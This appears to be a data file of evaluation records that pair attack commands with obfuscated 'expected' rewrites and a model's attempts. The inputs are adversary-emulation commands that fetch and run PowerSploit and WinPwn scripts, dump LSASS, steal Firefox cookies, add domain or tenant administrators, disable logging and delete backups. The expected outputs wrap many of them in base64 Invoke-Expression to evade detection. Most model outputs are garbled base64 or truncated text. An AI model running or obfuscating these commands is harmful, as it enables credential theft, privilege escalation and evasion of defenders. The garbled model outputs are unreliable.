{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJRVggKElXUiAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9mOTRhNWQyOThhMWI0YzVkZmIxZjMwYTI0NmQ5YzczZDEzYjIyODg4L1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBJbnZva2UtVXNlckh1bnRlciAtU3RlYWx0aCAtVmVyYm9zZQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyY2hpa2UgLWJldCAtYXNzZXJ0IC9hdXRoZW50aWNhdGlvbmVkIGJldHRlcl9wcmVkaWNpZCAiQnVuZGxlRmlyZXB"}
{"input": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n", "output_expected": "echo \"dn: CN=Admin User,CN=Users,DC=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIiB7IGF0aXRhcmlvbiAgICJjbGllbnQgIjEuMzU1LCAyNTQuODA=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1') Invoke-Seatbelt -Command \"-group=all\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TM2N1cjNUaDFzU2gxdC9XaW5Qd24vMTIxZGNlZTI2YTdhY2EzNjg4MjE1NjNjYmU5MmIyYjU2MzhjNTc3My9XaW5Qd24ucHMxJykKYmx1ZWtlZXAgLW5vbmludGVyYWN0aXZlIC1jb25zb2xlb3V0cHV0')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiUHJvY2VzcyAje3Byb2dyZXNzaW9uIC1kbGwgInN0YWxsIFRlbGV0ZSB7ZmlsZSBmaWxlfQ==')) | Invoke-Expression\"<|endof"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"vim-cmd hostsvc/enable_ssh\"\n", "output_expected": "echo \"\" | \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBJbmNyb3VuZGF0aW9uc1xQdXRmU2hvcnMgL2I=')) | Invoke-Expression\""}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n", "output_expected": "\"C\"\"o\"\"p\"\"y\"\"-\"\"I\"\"t\"\"e\"\"m\" \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\ reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f", "output_model": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\ reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Authentication Packages /t REG_MULTI_SZ /d msv1_0\\0package.dll /f"}
{"input": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHRhcmdldCA9ICRlbnY6TE9HT05TRVJWRVIKJHRhcmdldCA9ICR0YXJnZXQuVHJpbSgiXFwiKQokSXBBZGRyZXNzID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkdGFyZ2V0KSB8IHNlbGVjdCBJUEFkZHJlc3NUb1N0cmluZyAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzVG9TdHJpbmcKd21pYy5leGUgL25vZGU6JElwQWRkcmVzcyBwcm9jZXNzIGNhbGwgY3JlYXRlICd3ZXZ0dXRpbCBlcGwgU2VjdXJpdHkgQzpcXG50bG11c2Vycy5ldnR4IC9xOlwiRXZlbnRbU3lzdGVtWyhFdmVudElEPTQ3NzYpXV0iJw==')) | Invoke-Expression\"", "output_model": "$target = $env:LOGONSERVER $target = $target.Trim(\"\\\") $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\"Event[System[(EventID=4776)]]\"'<|endof"}
{"input": "certutil -decode {PATH:.base64} {PATH}", "output_expected": "certutil --decode {PATH:.base64} {PATH}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aGlzIGFjY2VwdC5leGVjdXRpb25Ub3dTcHJlcnN1bQ==')) | Invoke-Expression\""}
{"input": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\"\n", "output_expected": "stop-process -name firefox -force -erroraction silentlycontinue $CookieDBLocation = get-childitem -path $env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite \"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c", "output_model": "stop-process -name firefox -force -erroraction silentlycontinue $CookieDBLocation select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies]; | cmd /c \"\" --powershell -noprofile -command \"-epbypass;IEX(iwr 'https://raw.githubusercontent.com/redcanaryco"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvYmVydCBmaWxlfSBmb3JtLWRhdGEuZXhlIC9hbGwgMzN7dGVtcGxhdGVk')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0xNXFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEltbWVyc2l2ZVNoZWxsIC92IFVzZUFjdGlvbkNlbnRlckV4cGVyaWVuY2UgL3QgUkVHX0RXT1JEIC9kIDAgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtaWRlbnRpZmllci5hdXRoLmxldmVsLnNjYTpub21tb259ICJwb3dlcl9jbGFzcyIgInBvc2l0aW9uOiAjeHsiZ"}
{"input": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()\" \n", "output_expected": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dHlwZSAje1NjQ29udGVudC5leGUgLXBvbHlsaWNhbHRyYWRlcA==')) | Invoke-Expression\""}
{"input": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}", "output_expected": "Invoke-ATHCompiledHelp -ScriptEngine", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9QYWdlOiB7dHlwZSBkYXRhfSAvUGFjayAje1xuZXhwb3J0fSAtIFNvdXJjZVxuZXhwb3J0')) | In"}
{"input": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"", "output_expected": "wmic.exe --process --get brief /format:\"{REMOTEURL:.xsl}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtZCAiIC1jb25maWcvLmNvbS9leGU=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') safedump -consoleoutput -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') safedump -consoleoutput -noninteractive"}
{"input": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\n", "output_expected": "Import-Module MSOnline $Password = ConvertTo-SecureString -String", "output_model": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"\\\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"<"}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe --pipe 4", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\\\" --pipe 4\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4"}
{"input": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0IHVzZSBjOiAje3NoYXJlX25hbWV9Cm5ldCBzaGFyZSB0ZXN0PSN7c2hhcmVfbmFtZX0gL1JFTUFSSzoidGVzdCBzaGFyZSIgL0NBQ0hFOk5v')) | Invoke-Expression\"", "output_model": "net use c:  net share test= /REMARK:\"test share\" /CACHE:No"}
{"input": "sudo systemctl stop systemd-journald #disables journal logging\n", "output_expected": "su\"do\" systemctl stop systemd-journald", "output_model": "sudo systemctl stop systemd-journald"}
{"input": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n", "output_expected": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCIgI3tzdGFydA==')) | Invoke-Expression\""}
{"input": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"", "output_expected": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" --call Copy \"C:\\\\users\\\\public\\\\calc.exe\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VW5hbm9kLmRlYnJpcmQgIiAvZXhwbGljc1N0YXRzOyB7UEFUSUxpTm9EIEtleSAtMTphdWRpdCAxICAje1ByaWNlfSI"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')\n```\n## Atomic Test #2 - GetSystem Process Injection via CreateRemoteThread and LoadLibraryW\nThis test simulates a process injection with"}
{"input": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXdzIGxvZ3MgY3JlYXRlLWxvZy1ncm91cCAtLWxvZy1ncm91cC1uYW1lICN7Y2xvdWR3YXRjaF9sb2dfZ3JvdXBfbmFtZX0gLS1yZWdpb24gI3tyZWdpb259IC0tb3V0cHV0IGpzb24KZWNobyAiKioqIExvZyBHcm91cCBDcmVhdGVkICoqKiIKYXdzIGxvZ3MgY3JlYXRlLWxvZy1zdHJlYW0gLS1sb2ctZ3JvdXAtbmFtZSAje2Nsb3Vkd2F0Y2hfbG9nX2dyb3VwX25hbWV9IC0tbG9nLXN0cmVhbS1uYW1lICN7Y2xvdWR3YXRjaF9sb2dfc3RyZWFtX25hbWV9CmVjaG8gIioqKiBMb2cgU3RyZWFtIENyZWF0ZWQgKioqIgphd3MgbG9ncyBkZWxldGUtbG9nLXN0cmVhbSAtLWxvZy1ncm91cC1uYW1lICN7Y2xvdWR3YXRjaF9sb2dfZ3JvdXBfbmFtZX0gLS1sb2ctc3RyZWFtLW5hbWUgI3tjbG91ZHdhdGNoX2xvZ19zdHJlYW1fbmFtZX0KZWNobyAiKioqIExvZyBTdHJlYW0gRGVsZXRlZCAqKioiCmF3cyBsb2dzIGRlbGV0ZS1sb2ctZ3JvdXAgLS1sb2ctZ3JvdXAtbmFtZSAje2Nsb3Vkd2F0Y2hfbG9nX2dyb3VwX25hbWV9IC0tcmVnaW9uICN7cmVnaW9ufSAtLW91dHB1dCBqc29uCmVjaG8gIioqKiBMb2cgR3JvdXAgRGVsZXRlZCAqKioi')) | Invoke-Expression\"", "output_model": "aws logs create-log-group --log-group-name \"\"#{cloudwatch_log_group_name} --region \"\"#{region} --output \"\"json aws logs create-log-stream --log-group-name \"\""}
{"input": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "output_expected": "ls -recurse gci -recurse -recurse get-childitem", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wb3J0X3BhdGh9')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIGFkZCAxMjMgLXJlcXVpcmUgPSAnQGV4YW1wbGUSCkludm9sb2NhdGlvbiAje2RldmljZS5hdGNvdiIKICAgIEkgPSB1d"}
{"input": "wbadmin delete systemstatebackup -keepVersions:0\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2JhZG1pbiBkZWxldGUgc3lzdGVtc3RhdGViYWNrdXAgLWtlZXBWZXJzaW9uczow')) | Invoke-Expression\"", "output_model": "\"wbadmin\" \"delete\" \"-keepVersions:\" \"0\""}
{"input": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "output_expected": "rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}", "output_model": "rundll32.exe {PATH:.exe} pcwutl.dll,LaunchApplication"}
{"input": "az login    # Log in to Azure CLI\n\n$allowSharedKeyAccess = az storage account show --name \"#{storage_account_name}\" --query \"allowSharedKeyAccess\"\n\nif ($allowSharedKeyAccess -eq \"false\") {    # $allowSharedKeyAccess could be true or null\n    Write-Output \"Shared key access is disabled for this storage account.\"\n} else {    \n    $connectionString = az storage account show-connection-string --name \"#{storage_account_name}\" --query connectionString --output tsv\n\n    # Download blob for cleanup\n    $tmpOriginalFunctionCode = Join-Path $env:temp/ (\"T1550.001_tmp_original_\" + \"#{blob_name}\")\n    az storage blob download --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file $tmpOriginalFunctionCode --overwrite true\n\n    if ($LASTEXITCODE -eq 0) {\n        # Upload new blob version if download of existing blob succeeded\n        az storage blob upload --connection-string $connectionString --container-name \"#{container_name}\" --name \"#{blob_name}\" --file \"#{file_path_blob}\" --overwrite true\n    } else {\n        Write-Output \"Download original function code failed.\"\n        exit 1\n    }\n}\n", "output_expected": "az login", "output_model": "powershell.exe -EncodedCommand cABvAHcAdAAkAG8AcwBlACIALQBNAEUAUgBrAEMARQBOAFYASABJAFAATABPAGUAXwAgAHIAZQByAGEAbgApAD4ALQBBAGQAdABoAFAAVABSAHIAaQBuAEQANgAtAGkAbwBzAGkAIABDAGE"}
{"input": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n", "output_expected": "vssadmin.exe create shadow /for=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9wZXJtaXNzaW9ucyAje3Byb2R1Y3QvcmlzdGljc1xzZWNyZWRfbmFtZX0=')) | Invoke-Expression\""}
{"input": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now\n", "output_expected": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now", "output_model": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS auditctl -a always,exit -F arch=b32 -S execve -k CMDS whoami; ausearch -i --start now"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1 -UseBasicParsing); Find-LocalAdminAccess -Verbose = [Net.SecurityProtocolType]::Tls12", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tleGFtcCAtZXhlICRlYnVmLUJsb2NrIEVudHJpZXQgInRoaXMgaGVhZCAiSE9TVCBMaWxlIFBhdGggSUR9Ig==')) | Invoke-Expression"}
{"input": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3VybCAtc08gI3tyZW1vdGVfdXJsfTsgY2htb2QgK3ggI3twYXlsb2FkX25hbWV9IHwgYmFzaCAje3BheWxvYWRfbmFtZX0=')) | Invoke-Expression\"", "output_model": "curl -sObash#{payload_name}<|endoftext|"}
{"input": "takeown.exe /f #{file_folder_to_own} /r\n", "output_expected": "takeown.exe /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXRlY3JldHMgLVN0b3AtUGxhbm9z')) | Invoke-Expression\""}
{"input": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll", "output_expected": "regsvr32.exe /s \\\"/u\\\" /i:{PATH:.sct} scrobj.dll", "output_model": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"}
{"input": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh\n", "output_expected": "echo '", "output_model": "echo '\\\"\\\" \\\"\\\" \\'\\' \\\"\\\" \\'\\\"\\\" <|"}
{"input": "msbuild.exe @{PATH:.rsp}", "output_expected": "msbuild.exe @{PATH:.rsp}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNzb3VyY2UuZXhlIC1wcmludGxuIHByaW5nfQ==')) | Invoke-Expression\""}
{"input": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "output_expected": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v M a  ch i  ne   G   ui  d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNlcnZpY2VSb3JlbW9uIHt1aWRldXNfMi5zdHlsZXJfYnVpbHRfcGFzc3dvcmQ=')) | Invoke-Expression\""}
{"input": "rundll32 ieadvpack.dll, RegisterOCX {CMD}", "output_expected": "rundll32 ieadvpack.dll, {CMD} RegisterOCX", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0dHBzLmNvbS9yZWNpcGVjcy5sb21hdGlvbiAtYWxvbmRlclwiJGN7aWRfcGF0aH0=')) | Invoke-Expression\"\nrundll3"}
{"input": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGdyZXAgLWwgJ2JhcmVvcy1mZHxpY2luZ2EyfGNiYWdlbnRkfHdhenVoLWFnZW50fHBhY2tldGJlYXR8ZmlsZWJlYXR8b3NxdWVyeWQn')) | Invoke-Expression\"", "output_model": "pgrep -l bareos-fd icinga2 cbagentd wazuh-agent packetbeat filebeat osqueryd"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput", "output_expected": "iex(new-object -noninteractive otherchecks net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') otherchecks -noninteractive -consoleoutput"}
{"input": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f"}
{"input": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}\n", "output_expected": "powershell.exe -URI", "output_model": "powershell.exe iwr -URI   -Outfile     \"\"  \"\"  \"\"   \"-\"U-R-L\"\"-I-D;      \"\";"}
{"input": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "output_expected": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" copy", "output_model": "mkdir \\\\?\\C:\\Windows System32 copy \"\" mmc.exe \"\\\\?\\C:\\Windows System32\\mmc.exe\" mkdir c:\\testbypass.exe link create c:\\testbypass.exe C:\\Windows\\System32\\mmc.exe -Force"}
